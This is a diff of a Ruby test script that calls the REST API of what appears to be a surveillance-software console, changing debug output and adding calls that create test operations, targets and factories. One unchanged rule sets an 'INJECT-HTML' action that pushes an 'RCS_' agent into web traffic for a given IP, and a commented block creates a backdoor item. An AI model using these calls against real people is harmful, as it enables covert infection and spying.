@@ -353,14 +353,16 @@ if false
   # proxy.index
   res = http.request_get('/proxy', {'Cookie' => cookie})
   puts "proxy.index"
+  puts res.body
+  puts
   
   proxies = JSON.parse(res.body)
   proxies.each do |proxy|
     if proxy['_mid'] == 3
       proxy_id = proxy['_id']
     end
-    puts proxy
-    puts
+  #  puts proxy
+  #  puts
   end
   
   # proxy.delete
@@ -389,8 +391,9 @@ if false
   # proxy.show
   res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
   puts "proxy.show"
-  proxy = JSON.parse(res.body)
-  puts proxy.inspect
+  puts res.body
+  #proxy = JSON.parse(res.body)
+  #puts proxy.inspect
   puts
   
   # proxy.rules
@@ -404,22 +407,23 @@ if false
   puts res
   puts
   
-
   # proxy.add_rule
   puts "proxy.add_rule"
   rule = {rule: {enabled: true, disable_sync: false, ident: 'STATIC-IP', 
           ident_param: '14.11.78.4', probability: 100, resource: 'www.alor.it', 
           action: 'INJECT-HTML', action_param: 'RCS_0000602', target_id: '4e033ae62afb65e061000056'}}
   res = http.request_post("/proxy/add_rule/#{proxy_id}", rule.to_json, {'Cookie' => cookie})
+
   rule = JSON.parse(res.body)
-  puts rule
+  #puts rule
   puts
   
   # proxy.rules
   puts "proxy.show"
   res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
+  puts res.body
   proxy = JSON.parse(res.body)
-  puts proxy['rules'].inspect
+  #puts proxy['rules'].inspect
   puts
   
   # proxy.update_rule
@@ -433,8 +437,9 @@ if false
   # proxy.rules
   puts "proxy.show"
   res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
-  proxy = JSON.parse(res.body)
-  puts proxy['rules'].inspect
+  puts res.body
+  #proxy = JSON.parse(res.body)
+  #puts proxy['rules'].inspect
   puts
   
   # proxy.del_rule
@@ -561,6 +566,31 @@ if false
   puts res
   puts
   
+  puts "item.create operation"
+  operation_post = {name: "test operation", desc: "this is a test operation", _kind: "operation", contact: "billg@microsoft.com"}
+  res = http.request_post("/item/create", operation_post.to_json, {'Cookie' => cookie})
+  operation = JSON.parse(res.body)
+  puts operation
+  puts
+  
+  puts "item.create target"
+  target_post = {name: "test target", desc: "this is a test target", _kind: "target", operation: operation['_id'], target: target['_id']}
+  res = http.request_post("/item/create", target_post.to_json, {'Cookie' => cookie})
+  target = JSON.parse(res.body)
+  puts target
+  puts
+  
+  puts "item.create factory"
+  operation = {name: "test operation", desc: "this is a test operation", _kind: "factory"}
+  res = http.request_post("/item/create", operation.to_json, {'Cookie' => cookie})
+  puts res
+  puts
+  
+  #puts "item.create backdoor"
+  #operation = {name: "test operation", desc: "this is a test operation", _kind: "operation", contact: "billg@microsoft.com"}
+  #res = http.request_post("/item/create", operation.to_json, {'Cookie' => cookie})
+  #puts res
+  #puts
   
 end
 
